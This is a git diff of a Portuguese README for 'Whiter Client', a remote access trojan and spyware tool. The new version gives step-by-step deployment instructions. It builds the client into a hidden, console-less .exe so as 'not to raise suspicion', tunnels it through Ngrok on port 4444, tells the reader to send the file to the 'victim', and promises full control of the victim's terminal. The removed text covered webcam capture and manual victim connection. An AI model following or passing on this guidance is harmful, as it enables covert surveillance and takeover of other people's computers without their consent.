@@ -1,6 +1,6 @@
 
 
-# Whiter Client V0.1
+# Whiter Client V2.1
 
 By Dragonmodder (Jhon)
 
@@ -8,15 +8,14 @@ Whiter Client é uma ferramenta de administração remota (RAT) e também um spy
 
 Recursos principais:
 
-Conexão remota cliente/servidor via socket
 
-Execução de comandos no terminal da máquina alvo
+Arquivo .exe leve e disfarçado
 
-Captura de imagem da webcam remotamente
+Invisível (sem console) para não levantar suspeitas
 
-Interface leve e direta em modo texto
+Comunicação via Ngrok — conecta de qualquer lugar
 
-Compatível com Windows, Linux e Android (via Termux)
+Comandos de terminal em tempo real
 
 
 Observações:
@@ -39,51 +38,31 @@ git clone https://github.com/Dragonmodder7/Whiter-Client.git
 cd Whiter-Client
 python client.py
 
-Usando o Whiter client - Tutorial 
 
-Entendendo os arquivos
+Instalação (Servidor)
 
-server.py: você roda esse no seu celular ou PC, ele que vai controlar tudo.
-
-client.py: esse é o que a vítima tem que rodar, ele se conecta ao seu servidor.
+1. Instale o Python e o Ngrok
 
 
-Iniciando o servidor
-
-No seu aparelho (que vai comandar), roda:
-
-python server.py
-
-Ele vai pedir um IP e uma porta. Se for tudo local, coloca:
-
-HOST: 0.0.0.0
-PORTA: 4444
-
-Se quiser usar remotamente, você precisa do seu IP público ou usar algo como o ngrok.
+2. Rode: ngrok tcp 4444 e anote o IP e porta
 
 
-Conectando a vítima
-
-Na máquina da vítima (onde você quer ter o acesso), a pessoa precisa rodar:
-
-python client.py
-
-E colocar o IP e a porta do seu servidor, exemplo:
-
-IP do servidor: 192.168.0.100
-PORTA: 4444
-
-Assim que ela conectar, no seu terminal vai aparecer a conexão ativa.
+3. Substitua no client.py o IP e porta
 
 
-Comandos que você pode usar
+4. Gere o .exe invisível com:
 
-Depois que a conexão estiver feita, você pode digitar comandos como:
+pyinstaller --onefile --noconsole client.py
 
-ls: lista os arquivos da vítima
 
-cd nome_da_pasta: muda de pasta
+5. Envie o client.exe para a vítima
 
-webcam_snap: tira uma foto da webcam
 
-exit: encerra a conexão
+6. Execute python server.py e aguarde a conexão
+
+
+Comandos Disponíveis
+
+cd, ls, cat, exit e todos os comandos de terminal
+
+O terminal da vítima fica 100% sob seu controle. 
